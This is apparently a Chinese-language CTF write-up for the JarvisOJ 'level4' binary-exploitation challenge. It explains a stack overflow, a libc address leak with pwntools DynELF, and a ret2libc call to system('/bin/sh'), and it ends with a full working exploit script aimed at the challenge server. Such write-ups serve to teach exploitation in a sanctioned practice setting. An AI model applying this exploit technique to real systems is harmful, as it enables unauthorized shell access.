---
title: jarvisOj-level4
categories: 
- jarvisOj
---
# jarvis->level4

## 代码逻辑

程序本身很简单，使用F5转换成C代码，有一个vlunerable_function(),里面是很明显的栈溢出

![code](./1.jpg)
![code2](./2.jpg)

查看程序的保护措施，发现只有栈不可执行保护，这意味着不能在栈上执行代码。

![protection](./3.jpg)

## 调试

整体的思路比较简单，溢出之后在return addr填上system函数地址，之后跟fake ebp和'/bin/sh'的地址即可，但是在调试过程中发现程序中并没有现成的地址，因此要想办法自己获取Libc中的地址

![info](./4.jpg)

由于题目中没有给libc，我开始使用的是一个库Libcsearcher，基于libcdatabase，但是事实证明不太好使，找不到对应的libc，也可能是我使用姿势不对，之后想到用pwntools自带的DynELF配合leak得到system函数的地址，之后使用read将'/bin/sh'写入.bss段中，调用system('.bss_addr')即可拿到shell

代码里的leak函数是使用一种持续化泄露函数地址的方式讲指定的address输出出来，借此找到libc,后面的payload是使用read从用户输入中获取'/bin/sh'，之后三个pop将栈里的read三个参数都弹出栈，到ret的时候esp就是system_addr，它的参数是bss段的地址(可以用IDA查看)

## exp.py
```python
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level="info")
debug = 0
elf = ELF('./level4')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:
    sh = process('./level4')
else:
    sh = remote('pwn2.jarvisoj.com',9880)
#gdb.attach(sh)
def leak(address):
    padding = 'A' * 0x8c
    write_plt = elf.plt['write']
    vulnearbale_addr = elf.symbols['vulnerable_function']
    payload = padding + p32(write_plt) + p32(vulnearbale_addr) + p32(1) + p32(address) + p32(4)
    sh.send(payload)
    data = sh.recv(4)
    print "%x => %s" % (address, (data or '').encode('hex'))
    return data
d = DynELF(leak,elf=ELF('./level4'))
system_addr = d.lookup("system","libc")
bss_addr = 0x0804A024
read_plt = elf.plt['read']
pop_ret = 0x08048509
padding = 'A'*0x8C
vulnearbale_addr = elf.symbols['vulnerable_function']
payload = padding + p32(read_plt) + p32(pop_ret) +p32(0) + p32(bss_addr)\
        + p32(8) + p32(system_addr) + p32(vulnearbale_addr) +p32(bss_addr)
sh.sendline(payload)
sh.sendline('/bin/sh\x00')
sh.interactive()
sh.send(payload)
sh.interactive()
```
